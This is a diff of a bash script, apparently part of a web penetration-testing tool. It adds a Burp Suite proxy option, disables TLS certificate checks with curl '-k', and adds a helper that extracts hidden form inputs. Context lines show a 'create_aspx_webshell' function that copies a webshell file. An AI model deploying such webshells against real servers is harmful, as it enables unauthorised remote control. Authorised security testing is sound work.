@@ -76,10 +76,13 @@ get_hidden_inputs() {
         fi
         proxy_option="-x $proxy_type://$proxy_target:$proxy_port"
         echo "Using $proxy_option" >> $trail_log
+    elif [[ ! -z $use_burpsuite ]] && [[ $use_burpsuite == "true" ]]; then
+        proxy_option="--proxy localhost:8080"
+        echo "Using Burp Suite proxy" >> $trail_log
     fi
     #echo curl -c $cookie_jar -s "$url" $proxy_option 
     #echo curl -c $cookie_jar -s $proxy_option  $hidden_inputs_additional_options "$url"
-    local page=$(curl -b $cookie_jar -c $cookie_jar -s $proxy_option  $hidden_inputs_additional_options "$url")
+    local page=$(curl -k -b $cookie_jar -c $cookie_jar -s $proxy_option  $hidden_inputs_additional_options "$url")
     if [[ -z "$page" ]]; then
         echo "Failed to fetch the page. Please check the URL." >> $trail_log
         return 1
@@ -116,6 +119,18 @@ get_post_hidden_inputs() {
     echo $hidden_inputs
 }
 
+get_post_hidden_input_from_response() {
+    local response="$1"
+    local target_form="$2"
+    local hidden_inputs=$(extract_hidden_input "$response" "$target_form")
+    if [[ -z "$hidden_inputs" ]]; then
+        echo ""
+        return 0
+    fi
+    hidden_inputs=$(echo $hidden_inputs | sed -E 's/^,//')
+    hidden_inputs=$(echo $hidden_inputs | sed -E 's/,/\&/g')
+    echo $hidden_inputs
+}
 
 create_aspx_webshell() {
     cp $SCRIPTDIR/../aspx/webshell.aspx .
